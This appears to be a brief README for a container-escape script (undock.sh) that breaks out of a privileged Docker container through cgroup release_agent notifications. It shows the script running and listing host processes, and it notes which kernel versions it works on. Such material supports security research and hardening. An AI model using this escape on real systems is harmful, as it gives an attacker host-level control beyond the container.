A method of breaking out a privileged container using cgroups release notifications. The original author is @_fel1x (Felix Wilhelm) in a tweet https://twitter.com/_fel1x/status/1151487051986087936

An example:
```
docker run -it --rm --privileged alpine sh
/ # ./undock.sh ps
   PID TTY          TIME CMD
     1 ?        00:00:04 systemd
     2 ?        00:00:00 kthreadd
```

It requires at least one cgroup with a release_agent. In my limited testing, linux kernel 4.9 (docker-ce) didn't have it, neither did 4.15 in an old VM, but 4.19 did. 

More info on how cgroup release notifications work at http://man7.org/linux/man-pages/man7/cgroups.7.html
